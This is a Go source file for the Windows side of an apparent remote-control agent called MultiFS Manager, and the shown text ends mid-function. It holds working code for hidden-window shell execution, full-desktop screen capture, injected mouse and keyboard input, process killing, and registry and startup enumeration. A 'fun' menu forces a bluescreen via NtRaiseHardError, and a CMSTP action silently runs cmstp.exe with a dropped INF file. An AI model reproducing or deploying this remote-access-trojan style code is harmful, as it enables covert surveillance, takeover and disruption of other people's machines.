//go:build agent && windows
// +build agent,windows

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image"
	"image/jpeg"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"multifs-advanced/internal/protocol"
	"multifs-advanced/third_party/registry"
	"multifs-advanced/third_party/windows"
)

var (
	user32                       = syscall.NewLazyDLL("user32.dll")
	kernel32                     = syscall.NewLazyDLL("kernel32.dll")
	gdi32                        = syscall.NewLazyDLL("gdi32.dll")
	winmm                        = syscall.NewLazyDLL("winmm.dll")
	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	procLockWorkStation          = user32.NewProc("LockWorkStation")
	procSendMessageW             = user32.NewProc("SendMessageW")
	procMessageBoxW              = user32.NewProc("MessageBoxW")
	procGetDesktopWindow         = user32.NewProc("GetDesktopWindow")
	procGetDC                    = user32.NewProc("GetDC")
	procReleaseDC                = user32.NewProc("ReleaseDC")
	procGetSystemMetrics         = user32.NewProc("GetSystemMetrics")
	procSetProcessDPIAware       = user32.NewProc("SetProcessDPIAware")
	procCreateCompatibleDC       = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap   = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject             = gdi32.NewProc("SelectObject")
	procBitBlt                   = gdi32.NewProc("BitBlt")
	procDeleteDC                 = gdi32.NewProc("DeleteDC")
	procDeleteObject             = gdi32.NewProc("DeleteObject")
	procGetDIBits                = gdi32.NewProc("GetDIBits")
	procGetProcessMemoryInfo     = kernel32.NewProc("K32GetProcessMemoryInfo")
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW          = kernel32.NewProc("Process32FirstW")
	procProcess32NextW           = kernel32.NewProc("Process32NextW")
	procOpenProcess              = kernel32.NewProc("OpenProcess")
	procCloseHandle              = kernel32.NewProc("CloseHandle")
	procTerminateProcess         = kernel32.NewProc("TerminateProcess")
	procSetCursorPos             = user32.NewProc("SetCursorPos")
	procMouseEvent               = user32.NewProc("mouse_event")
	procKeybdEvent               = user32.NewProc("keybd_event")
	procCloseCDTray              = winmm.NewProc("mciSendStringW")
	procNtRaiseHardError         = ntdll.NewProc("NtRaiseHardError")
)

const (
	HWND_BROADCAST            = 0xffff
	WM_SYSCOMMAND             = 0x0112
	SC_MONITORPOWER           = 0xF170
	SM_CXSCREEN               = 0
	SM_CYSCREEN               = 1
	SM_XVIRTUALSCREEN         = 76
	SM_YVIRTUALSCREEN         = 77
	SM_CXVIRTUALSCREEN        = 78
	SM_CYVIRTUALSCREEN        = 79
	SRCCOPY                   = 0x00CC0020
	BI_RGB                    = 0
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_TERMINATE         = 0x0001
	PROCESS_VM_READ           = 0x0010
	TOKEN_QUERY               = 0x0008
	TH32CS_SNAPPROCESS        = 0x00000002
	MOUSEEVENTF_MOVE          = 0x0001
	MOUSEEVENTF_LEFTDOWN      = 0x0002
	MOUSEEVENTF_LEFTUP        = 0x0004
	MOUSEEVENTF_RIGHTDOWN     = 0x0008
	MOUSEEVENTF_RIGHTUP       = 0x0010
	MOUSEEVENTF_MIDDLEDOWN    = 0x0020
	MOUSEEVENTF_MIDDLEUP      = 0x0040
	MOUSEEVENTF_WHEEL         = 0x0800
	MOUSEEVENTF_ABSOLUTE      = 0x8000
	MOUSEEVENTF_VIRTUALDESK   = 0x4000
	KEYEVENTF_EXTENDEDKEY     = 0x0001
	KEYEVENTF_KEYUP           = 0x0002
	MB_SERVICE_NOTIFICATION   = 0x00200000
	MB_OK                     = 0x00000000
	MB_ICONINFORMATION        = 0x00000040
	MB_ICONWARNING            = 0x00000030
	MB_ICONERROR              = 0x00000010
)

var (
	screenCaptureMu sync.Mutex
	remoteInputMu   sync.Mutex
	dpiAwareOnce    sync.Once
)

type PROCESS_MEMORY_COUNTERS struct {
	cb                         uint32
	PageFaultCount             uint32
	PeakWorkingSetSize         uintptr
	WorkingSetSize             uintptr
	QuotaPeakPagedPoolUsage    uintptr
	QuotaPagedPoolUsage        uintptr
	QuotaPeakNonPagedPoolUsage uintptr
	QuotaNonPagedPoolUsage     uintptr
	PagefileUsage              uintptr
	PeakPagefileUsage          uintptr
}

type PROCESSENTRY32W struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

type BITMAPINFOHEADER struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

// Power operations
func (a *agent) opPower(req *protocol.Request) {
	action, _ := req.Args["action"].(string)
	if action == "" {
		a.replyErr(req.ID, "missing action")
		return
	}
	if err := powerAction(action); err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	a.replyOK(req.ID, map[string]any{"action": action})
}

func powerAction(action string) error {
	switch action {
	case "shutdown":
		return exec.Command("shutdown", "/s", "/t", "0").Start()
	case "restart":
		return exec.Command("shutdown", "/r", "/t", "0").Start()
	case "sleep":
		return exec.Command("rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0").Start()
	case "lock":
		r, _, err := procLockWorkStation.Call()
		if r == 0 {
			return err
		}
		return nil
	case "display_off":
		procSendMessageW.Call(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
		return nil
	case "logoff":
		return exec.Command("shutdown", "/l").Start()
	default:
		return fmt.Errorf("unknown action: %s", action)
	}
}

// Fun menu operations
func (a *agent) opFun(req *protocol.Request) {
	action, _ := req.Args["action"].(string)
	if action == "" {
		a.replyErr(req.ID, "missing action")
		return
	}

	switch action {
	case "monitor_off":
		procSendMessageW.Call(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
	case "monitor_on":
		procSendMessageW.Call(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, ^uintptr(0))
	case "cd_open":
		cdTray("open")
	case "cd_close":
		cdTray("closed")
	case "bluescreen":
		if err := triggerBluescreen(); err != nil {
			a.replyErr(req.ID, err.Error())
			return
		}
	default:
		a.replyErr(req.ID, "unknown fun action")
		return
	}

	a.replyOK(req.ID, map[string]any{"action": action})
}

func cdTray(state string) {
	cmd := fmt.Sprintf("set cdaudio door %s", state)
	cmdPtr, _ := syscall.UTF16PtrFromString(cmd)
	procCloseCDTray.Call(uintptr(unsafe.Pointer(cmdPtr)), 0, 0, 0)
}

func triggerBluescreen() error {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return err
	}
	defer token.Close()

	var prevLen uint32
	priv := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}

	shutdownPriv, _ := windows.UTF16PtrFromString("SeShutdownPrivilege")
	err = windows.LookupPrivilegeValue(nil, shutdownPriv, &priv.Privileges[0].Luid)
	if err != nil {
		return err
	}

	err = windows.AdjustTokenPrivileges(token, false, &priv, uint32(unsafe.Sizeof(priv)), nil, &prevLen)
	if err != nil {
		return err
	}

	var response uint32
	ret, _, _ := procNtRaiseHardError.Call(
		0xC000021A,
		0, 0, 0, 6,
		uintptr(unsafe.Pointer(&response)),
	)
	if ret != 0 {
		return fmt.Errorf("NtRaiseHardError failed: 0x%X", ret)
	}
	return nil
}

// Message Box - visible in the reliable LAN build.
func (a *agent) opMessageBox(req *protocol.Request) {
	title, _ := req.Args["title"].(string)
	message, _ := req.Args["message"].(string)
	msgType, _ := req.Args["type"].(string)
	if title == "" {
		title = "Message"
	}
	if message == "" {
		message = "Hello from MultiFS Manager!"
	}

	flags := uintptr(MB_OK | MB_ICONINFORMATION)
	switch strings.ToLower(strings.TrimSpace(msgType)) {
	case "warning", "warn":
		flags = MB_OK | MB_ICONWARNING
	case "error", "danger":
		flags = MB_OK | MB_ICONERROR
	}

	titlePtr, err1 := syscall.UTF16PtrFromString(title)
	msgPtr, err2 := syscall.UTF16PtrFromString(message)
	if err1 != nil || err2 != nil {
		a.replyErr(req.ID, "message contains invalid characters")
		return
	}

	// Show asynchronously so the server UI gets an immediate success response;
	// the user can dismiss the dialog whenever convenient.
	go procMessageBoxW.Call(0, uintptr(unsafe.Pointer(msgPtr)), uintptr(unsafe.Pointer(titlePtr)), flags)
	a.replyOK(req.ID, map[string]any{"sent": true, "visible": true})
}

// Screen Capture - Optimized with proper error handling and faster conversion
func (a *agent) opScreenCapture(req *protocol.Request) {
	defer func() {
		if r := recover(); r != nil {
			a.replyErr(req.ID, fmt.Sprintf("screen capture error: %v", r))
		}
	}()
	if !screenCaptureMu.TryLock() {
		a.replyErr(req.ID, "screen capture busy")
		return
	}
	defer screenCaptureMu.Unlock()

	quality, _ := req.Args["quality"].(float64)
	if quality <= 0 || quality > 100 {
		quality = 70
	}
	qStr, _ := req.Args["quality"].(string)
	if qStr != "" {
		var q int
		if _, err := fmt.Sscanf(qStr, "%d", &q); err == nil && q > 0 && q <= 100 {
			quality = float64(q)
		}
	}

	// Make the process DPI aware before querying/capturing the desktop.
	// Without this on high-DPI systems, Windows can return scaled logical
	// metrics while GDI capture works in physical pixels, which can look
	// like a cropped/cut-out remote screen.
	dpiAwareOnce.Do(func() { _, _, _ = procSetProcessDPIAware.Call() })

	// Capture the entire virtual desktop, not only the primary monitor.
	// SM_CXSCREEN/SM_CYSCREEN only describe the primary monitor; multi-monitor
	// or non-zero-origin desktops need the virtual-screen rectangle.
	vxRaw, _, _ := procGetSystemMetrics.Call(SM_XVIRTUALSCREEN)
	vyRaw, _, _ := procGetSystemMetrics.Call(SM_YVIRTUALSCREEN)
	width, _, _ := procGetSystemMetrics.Call(SM_CXVIRTUALSCREEN)
	height, _, _ := procGetSystemMetrics.Call(SM_CYVIRTUALSCREEN)
	if width == 0 || height == 0 {
		// Fallback for very old/limited environments.
		vxRaw, vyRaw = 0, 0
		width, _, _ = procGetSystemMetrics.Call(SM_CXSCREEN)
		height, _, _ = procGetSystemMetrics.Call(SM_CYSCREEN)
	}
	if width == 0 || height == 0 {
		a.replyErr(req.ID, "failed to get screen dimensions")
		return
	}
	vx, vy := int32(vxRaw), int32(vyRaw)
	w, h := int32(width), int32(height)
	if w <= 0 || h <= 0 || w > 32767 || h > 32767 {
		a.replyErr(req.ID, "invalid screen dimensions")
		return
	}

	// Get DC
	hwnd, _, _ := procGetDesktopWindow.Call()
	if hwnd == 0 {
		a.replyErr(req.ID, "failed to get desktop window")
		return
	}

	hdc, _, _ := procGetDC.Call(hwnd)
	if hdc == 0 {
		a.replyErr(req.ID, "failed to get device context")
		return
	}
	defer procReleaseDC.Call(hwnd, hdc)

	// Create compatible DC
	memDC, _, _ := procCreateCompatibleDC.Call(hdc)
	if memDC == 0 {
		a.replyErr(req.ID, "failed to create compatible DC")
		return
	}
	defer procDeleteDC.Call(memDC)

	// Create bitmap
	bitmap, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(w), uintptr(h))
	if bitmap == 0 {
		a.replyErr(req.ID, "failed to create bitmap")
		return
	}
	defer procDeleteObject.Call(bitmap)

	// Select bitmap into DC
	oldObj, _, _ := procSelectObject.Call(memDC, bitmap)
	if oldObj == 0 {
		a.replyErr(req.ID, "failed to select bitmap")
		return
	}
	defer procSelectObject.Call(memDC, oldObj)

	// Copy screen
	ret, _, _ := procBitBlt.Call(memDC, 0, 0, uintptr(w), uintptr(h), hdc, uintptr(vx), uintptr(vy), SRCCOPY)
	if ret == 0 {
		a.replyErr(req.ID, "failed to capture screen")
		return
	}

	// Calculate row stride ( padded to 4-byte boundary)
	rowStride := ((int(w) * 3) + 3) &^ 3
	bufSize := rowStride * int(h)
	if bufSize <= 0 || bufSize > 256*1024*1024 {
		a.replyErr(req.ID, "invalid buffer size")
		return
	}

	bmpHeader := BITMAPINFOHEADER{
		BiSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
		BiWidth:       w,
		BiHeight:      h,
		BiPlanes:      1,
		BiBitCount:    24,
		BiCompression: BI_RGB,
		BiSizeImage:   uint32(bufSize),
	}

	buf := make([]byte, bufSize)

	bmpInfo := struct {
		bmiHeader BITMAPINFOHEADER
		bmiColors [1]uint32
	}{bmiHeader: bmpHeader}

	ret, _, _ = procGetDIBits.Call(
		hdc,
		bitmap,
		0,
		uintptr(h),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bmpInfo)),
		0,
	)
	if ret == 0 {
		a.replyErr(req.ID, "failed to get bitmap bits")
		return
	}

	// Convert BGR to RGBA - optimized single-pass
	img := image.NewRGBA(image.Rect(0, 0, int(w), int(h)))
	imgPix := img.Pix
	iw := int(w)
	ih := int(h)

	for y := 0; y < ih; y++ {
		rowOff := (ih - 1 - y) * rowStride
		pixOff := y * iw * 4
		for x := 0; x < iw; x++ {
			src := rowOff + x*3
			dst := pixOff + x*4
			imgPix[dst+0] = buf[src+2] // R
			imgPix[dst+1] = buf[src+1] // G
			imgPix[dst+2] = buf[src+0] // B
			imgPix[dst+3] = 255        // A
		}
	}

	// Encode to JPEG
	var jpegBuf bytes.Buffer
	if err := jpeg.Encode(&jpegBuf, img, &jpeg.Options{Quality: int(quality)}); err != nil {
		a.replyErr(req.ID, "failed to encode image: "+err.Error())
		return
	}

	frame := base64.StdEncoding.EncodeToString(jpegBuf.Bytes())
	a.replyOK(req.ID, map[string]any{
		"frame":  frame,
		"width":  int(w),
		"height": int(h),
		"left":   int(vx),
		"top":    int(vy),
	})
}

// Remote Input - Fixed with proper validation

func moveRemoteCursor(req *protocol.Request) {
	x, _ := req.Args["x"].(float64)
	y, _ := req.Args["y"].(float64)
	screenW, _ := req.Args["screenW"].(float64)
	screenH, _ := req.Args["screenH"].(float64)
	if screenW <= 0 || screenH <= 0 {
		return
	}
	absX := int(x * 65535.0 / screenW)
	absY := int(y * 65535.0 / screenH)
	if absX < 0 {
		absX = 0
	}
	if absX > 65535 {
		absX = 65535
	}
	if absY < 0 {
		absY = 0
	}
	if absY > 65535 {
		absY = 65535
	}
	procMouseEvent.Call(MOUSEEVENTF_MOVE|MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_VIRTUALDESK, uintptr(absX), uintptr(absY), 0, 0)
}

func (a *agent) opRemoteInput(req *protocol.Request) {
	remoteInputMu.Lock()
	defer remoteInputMu.Unlock()

	inputType, _ := req.Args["type"].(string)
	if inputType == "" {
		a.replyErr(req.ID, "missing input type")
		return
	}

	switch inputType {
	case "mousemove":
		x, _ := req.Args["x"].(float64)
		y, _ := req.Args["y"].(float64)
		screenW, _ := req.Args["screenW"].(float64)
		screenH, _ := req.Args["screenH"].(float64)

		if screenW <= 0 || screenH <= 0 {
			a.replyErr(req.ID, "invalid screen dimensions")
			return
		}
		absX := int(x * 65535.0 / screenW)
		absY := int(y * 65535.0 / screenH)
		// Clamp
		if absX < 0 {
			absX = 0
		}
		if absX > 65535 {
			absX = 65535
		}
		if absY < 0 {
			absY = 0
		}
		if absY > 65535 {
			absY = 65535
		}
		procMouseEvent.Call(MOUSEEVENTF_MOVE|MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_VIRTUALDESK, uintptr(absX), uintptr(absY), 0, 0)

	case "mousedown":
		moveRemoteCursor(req)
		button, _ := req.Args["button"].(float64)
		var flags uintptr
		switch int(button) {
		case 0:
			flags = MOUSEEVENTF_LEFTDOWN
		case 1:
			flags = MOUSEEVENTF_MIDDLEDOWN
		case 2:
			flags = MOUSEEVENTF_RIGHTDOWN
		default:
			a.replyErr(req.ID, "invalid button")
			return
		}
		procMouseEvent.Call(flags, 0, 0, 0, 0)

	case "mouseup":
		moveRemoteCursor(req)
		button, _ := req.Args["button"].(float64)
		var flags uintptr
		switch int(button) {
		case 0:
			flags = MOUSEEVENTF_LEFTUP
		case 1:
			flags = MOUSEEVENTF_MIDDLEUP
		case 2:
			flags = MOUSEEVENTF_RIGHTUP
		default:
			a.replyErr(req.ID, "invalid button")
			return
		}
		procMouseEvent.Call(flags, 0, 0, 0, 0)

	case "wheel":
		moveRemoteCursor(req)
		delta, _ := req.Args["delta"].(float64)
		procMouseEvent.Call(MOUSEEVENTF_WHEEL, 0, 0, uintptr(int(delta)), 0)

	case "keydown":
		keyCode, _ := req.Args["keyCode"].(float64)
		if keyCode <= 0 || keyCode > 255 {
			a.replyErr(req.ID, "invalid key code")
			return
		}
		procKeybdEvent.Call(uintptr(keyCode), 0, 0, 0)

	case "keyup":
		keyCode, _ := req.Args["keyCode"].(float64)
		if keyCode <= 0 || keyCode > 255 {
			a.replyErr(req.ID, "invalid key code")
			return
		}
		procKeybdEvent.Call(uintptr(keyCode), 0, KEYEVENTF_KEYUP, 0)

	default:
		a.replyErr(req.ID, "unknown input type")
		return
	}

	a.replyOK(req.ID, map[string]any{"ok": true})
}

// Process Manager - Fixed with nil checks and resource cleanup
func (a *agent) opProcesses(req *protocol.Request) {
	processes, err := getProcessList()
	if err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	a.replyOK(req.ID, map[string]any{"processes": processes})
}

func getProcessList() ([]protocol.ProcessInfo, error) {
	snapshot, _, err := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snapshot == uintptr(^uintptr(0)) || snapshot == 0 {
		return nil, fmt.Errorf("failed to create process snapshot: %v", err)
	}
	defer procCloseHandle.Call(snapshot)

	var pe PROCESSENTRY32W
	pe.dwSize = uint32(unsafe.Sizeof(pe))

	var processes []protocol.ProcessInfo

	ret, _, _ := procProcess32FirstW.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
	for ret != 0 {
		name := syscall.UTF16ToString(pe.szExeFile[:])
		if name == "" {
			name = "(unknown)"
		}

		memMB, user := getProcessInfo(pe.th32ProcessID)

		processes = append(processes, protocol.ProcessInfo{
			PID:      int32(pe.th32ProcessID),
			Name:     name,
			Username: user,
			MemoryMB: memMB,
			Status:   "Running",
		})

		ret, _, _ = procProcess32NextW.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
	}

	return processes, nil
}

func getProcessInfo(pid uint32) (float64, string) {
	if pid == 0 {
		return 0, ""
	}

	hProcess, _, _ := procOpenProcess.Call(
		PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
		0,
		uintptr(pid),
	)
	if hProcess == 0 {
		return 0, ""
	}
	defer procCloseHandle.Call(hProcess)

	var memCounters PROCESS_MEMORY_COUNTERS
	memCounters.cb = uint32(unsafe.Sizeof(memCounters))

	procGetProcessMemoryInfo.Call(
		hProcess,
		uintptr(unsafe.Pointer(&memCounters)),
		uintptr(memCounters.cb),
	)

	memMB := float64(memCounters.WorkingSetSize) / (1024.0 * 1024.0)
	user := ""

	var token windows.Token
	if err := windows.OpenProcessToken(windows.Handle(hProcess), TOKEN_QUERY, &token); err == nil {
		defer token.Close()
		user = getTokenUser(token)
	}

	return memMB, user
}

func getTokenUser(token windows.Token) string {
	var needed uint32
	_ = windows.GetTokenInformation(token, windows.TokenUser, nil, 0, &needed)
	if needed == 0 || needed > 65536 {
		return ""
	}

	buf := make([]byte, needed)
	if err := windows.GetTokenInformation(token, windows.TokenUser, &buf[0], needed, &needed); err != nil {
		return ""
	}

	tu := (*windows.Tokenuser)(unsafe.Pointer(&buf[0]))

	var nameLen, domainLen uint32
	var use uint32
	_ = windows.LookupAccountSid(nil, tu.User.Sid, nil, &nameLen, nil, &domainLen, &use)

	if nameLen == 0 || nameLen > 1024 {
		return ""
	}
	if domainLen == 0 {
		domainLen = 1
	}

	nameBuf := make([]uint16, nameLen)
	domainBuf := make([]uint16, domainLen)
	_ = windows.LookupAccountSid(nil, tu.User.Sid, &nameBuf[0], &nameLen, &domainBuf[0], &domainLen, &use)

	return syscall.UTF16ToString(nameBuf)
}

func (a *agent) opProcessKill(req *protocol.Request) {
	pidFloat, _ := req.Args["pid"].(float64)
	pid := uint32(pidFloat)
	if pid == 0 {
		a.replyErr(req.ID, "missing or invalid pid")
		return
	}

	hProcess, _, _ := procOpenProcess.Call(PROCESS_TERMINATE, 0, uintptr(pid))
	if hProcess == 0 {
		a.replyErr(req.ID, "failed to open process")
		return
	}
	defer procCloseHandle.Call(hProcess)

	ret, _, _ := procTerminateProcess.Call(hProcess, 1)
	if ret == 0 {
		a.replyErr(req.ID, "failed to terminate process")
		return
	}

	a.replyOK(req.ID, map[string]any{"killed": pid})
}

func (a *agent) opProcessRun(req *protocol.Request) {
	command, _ := req.Args["command"].(string)
	args, _ := req.Args["args"].(string)

	if command == "" {
		a.replyErr(req.ID, "missing command")
		return
	}

	cmd := exec.Command(command, strings.Fields(args)...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: CREATE_NO_WINDOW,
	}

	if err := cmd.Start(); err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}

	a.replyOK(req.ID, map[string]any{"started": command})
}

// Registry Manager
func (a *agent) opRegistry(req *protocol.Request) {
	regPath, _ := req.Args["path"].(string)
	if regPath == "" {
		regPath = "HKLM"
	}

	key, subPath := parseRegistryPath(regPath)

	k, err := registry.OpenKey(key, subPath, registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
	if err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	defer k.Close()

	subKeyNames, _ := k.ReadSubKeyNames(-1)
	valueNames, _ := k.ReadValueNames(-1)

	var values []protocol.RegistryValue
	for _, name := range valueNames {
		val, valType, err := k.GetStringValue(name)
		if err != nil {
			_, _, err = k.GetBinaryValue(name)
			if err == nil {
				val = "(binary)"
				valType = registry.BINARY
			}
		}

		typeStr := "REG_SZ"
		switch valType {
		case registry.EXPAND_SZ:
			typeStr = "REG_EXPAND_SZ"
		case registry.BINARY:
			typeStr = "REG_BINARY"
		case registry.DWORD:
			typeStr = "REG_DWORD"
		case registry.QWORD:
			typeStr = "REG_QWORD"
		case registry.MULTI_SZ:
			typeStr = "REG_MULTI_SZ"
		}

		values = append(values, protocol.RegistryValue{
			Name:  name,
			Type:  typeStr,
			Value: val,
		})
	}

	a.replyOK(req.ID, protocol.RegistryKey{
		Path:    regPath,
		SubKeys: subKeyNames,
		Values:  values,
	})
}

func (a *agent) opRegistryRead(req *protocol.Request) {
	regPath, _ := req.Args["path"].(string)
	valueName, _ := req.Args["value"].(string)

	if regPath == "" {
		a.replyErr(req.ID, "missing path")
		return
	}

	key, subPath := parseRegistryPath(regPath)

	k, err := registry.OpenKey(key, subPath, registry.QUERY_VALUE)
	if err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	defer k.Close()

	val, valType, err := k.GetStringValue(valueName)
	if err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}

	typeStr := "REG_SZ"
	switch valType {
	case registry.EXPAND_SZ:
		typeStr = "REG_EXPAND_SZ"
	case registry.BINARY:
		typeStr = "REG_BINARY"
	case registry.DWORD:
		typeStr = "REG_DWORD"
	case registry.QWORD:
		typeStr = "REG_QWORD"
	case registry.MULTI_SZ:
		typeStr = "REG_MULTI_SZ"
	}

	a.replyOK(req.ID, map[string]any{
		"name":  valueName,
		"type":  typeStr,
		"value": val,
	})
}

func parseRegistryPath(path string) (registry.Key, string) {
	parts := strings.SplitN(path, "\\", 2)
	root := parts[0]
	subPath := ""
	if len(parts) > 1 {
		subPath = parts[1]
	}

	switch root {
	case "HKLM":
		return registry.LOCAL_MACHINE, subPath
	case "HKCU":
		return registry.CURRENT_USER, subPath
	case "HKCR":
		return registry.CLASSES_ROOT, subPath
	case "HKU":
		return registry.USERS, subPath
	case "HKCC":
		return registry.CURRENT_CONFIG, subPath
	default:
		return registry.LOCAL_MACHINE, subPath
	}
}

// Shell
func (a *agent) opShell(req *protocol.Request) {
	command, _ := req.Args["command"].(string)
	if command == "" {
		a.replyErr(req.ID, "missing command")
		return
	}

	cmd := exec.Command("cmd.exe", "/c", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: CREATE_NO_WINDOW,
	}

	output, err := cmd.CombinedOutput()

	result := map[string]any{
		"output": string(output),
	}
	if err != nil {
		result["error"] = err.Error()
	}

	a.replyOK(req.ID, result)
}

// Startup Manager
func (a *agent) opStartup(req *protocol.Request) {
	items, err := getStartupItems()
	if err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	a.replyOK(req.ID, map[string]any{"items": items})
}

func getStartupItems() ([]protocol.StartupEntry, error) {
	var items []protocol.StartupEntry

	// HKLM Run
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE)
	if err == nil {
		names, _ := k.ReadValueNames(-1)
		for _, name := range names {
			val, _, _ := k.GetStringValue(name)
			items = append(items, protocol.StartupEntry{
				Name:     name,
				Path:     val,
				Location: "HKLM\\Run",
				Enabled:  true,
			})
		}
		k.Close()
	}

	// HKCU Run
	k, err = registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE)
	if err == nil {
		names, _ := k.ReadValueNames(-1)
		for _, name := range names {
			val, _, _ := k.GetStringValue(name)
			items = append(items, protocol.StartupEntry{
				Name:     name,
				Path:     val,
				Location: "HKCU\\Run",
				Enabled:  true,
			})
		}
		k.Close()
	}

	// Startup folders
	startupPaths := []string{
		os.Getenv("ALLUSERSPROFILE") + `\Microsoft\Windows\Start Menu\Programs\Startup`,
		os.Getenv("APPDATA") + `\Microsoft\Windows\Start Menu\Programs\Startup`,
	}

	for _, path := range startupPaths {
		entries, _ := os.ReadDir(path)
		for _, entry := range entries {
			if !entry.IsDir() && strings.HasSuffix(strings.ToLower(entry.Name()), ".lnk") {
				items = append(items, protocol.StartupEntry{
					Name:     strings.TrimSuffix(entry.Name(), ".lnk"),
					Path:     filepath.Join(path, entry.Name()),
					Location: "Startup Folder",
					Enabled:  true,
				})
			}
		}
	}

	return items, nil
}

func (a *agent) opStartupRemove(req *protocol.Request) {
	name, _ := req.Args["name"].(string)
	if name == "" {
		a.replyErr(req.ID, "missing name")
		return
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		err = k.DeleteValue(name)
		k.Close()
		if err == nil {
			a.replyOK(req.ID, map[string]any{"removed": name})
			return
		}
	}

	a.replyErr(req.ID, "failed to remove startup item")
}

// CMSTP
func (a *agent) opCmstp(req *protocol.Request) {
	action, _ := req.Args["action"].(string)

	switch action {
	case "install":
		infContent := `[Version]
Signature=$Windows NT$
[DefaultInstall]
AddReg=TestSection
[TestSection]
HKLM,"SOFTWARE\Test","Value",0x00010001,1
`
		tmpDir := os.TempDir()
		infPath := filepath.Join(tmpDir, "cmstp_test.inf")
		os.WriteFile(infPath, []byte(infContent), 0644)

		cmd := exec.Command("cmstp.exe", "/s", infPath)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: CREATE_NO_WINDOW,
		}
		if err := cmd.Run(); err != nil {
			a.replyErr(req.ID, err.Error())
			return
		}

	case "uninstall":
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.SET_VALUE)
		if err == nil {
			_ = registry.DeleteKey(k, "Test")
			_ = k.Close()
		}

	default:
		a.replyErr(req.ID, "unknown cmstp action")
		return
	}

	a.replyOK(req.ID, map[string]any{"action": action})
}

// Logs
func (a *agent) opLogs(req *protocol.Request) {
	source, _ := req.Args["source"].(string)
	_ = req.Args["level"].(string) // reserved for future use

	var logName string
	switch source {
	case "application":
		logName = "Application"
	case "security":
		logName = "Security"
	default:
		logName = "System"
	}

	cmd := exec.Command("wevtutil", "qe", logName, "/c:50", "/f:text", "/q:*[System[(Level<=3)]]")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: CREATE_NO_WINDOW,
	}
	output, err := cmd.Output()

	var logs []protocol.LogEntry
	if err == nil {
		lines := strings.Split(string(output), "\n")
		var currentLog protocol.LogEntry

		for _, line := range lines {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "Event[") {
				if currentLog.Message != "" {
					logs = append(logs, currentLog)
				}
				currentLog = protocol.LogEntry{Timestamp: time.Now().Unix()}
			} else if strings.Contains(line, "Level:") {
				if strings.Contains(line, "Error") {
					currentLog.Level = "Error"
				} else if strings.Contains(line, "Warning") {
					currentLog.Level = "Warning"
				} else {
					currentLog.Level = "Info"
				}
			} else if strings.Contains(line, "Source:") {
				parts := strings.SplitN(line, ":", 2)
				if len(parts) > 1 {
					currentLog.Source = strings.TrimSpace(parts[1])
				}
			} else if line != "" && !strings.HasPrefix(line, "-") {
				currentLog.Message += line + " "
			}
		}

		if currentLog.Message != "" {
			logs = append(logs, currentLog)
		}
	}

	if len(logs) == 0 {
		logs = append(logs, protocol.LogEntry{
			Timestamp: time.Now().Unix(),
			Level:     "Info",
			Source:    "MultiFS",
			Message:   "Agent connected successfully",
		})
	}

	a.replyOK(req.ID, map[string]any{"logs": logs})
}

// Agent Control
func (a *agent) opAgentClose(req *protocol.Request) {
	a.replyOK(req.ID, map[string]any{"closing": true})
	go func() {
		time.Sleep(500 * time.Millisecond)
		os.Exit(0)
	}()
}

func (a *agent) opAgentRelaunch(req *protocol.Request) {
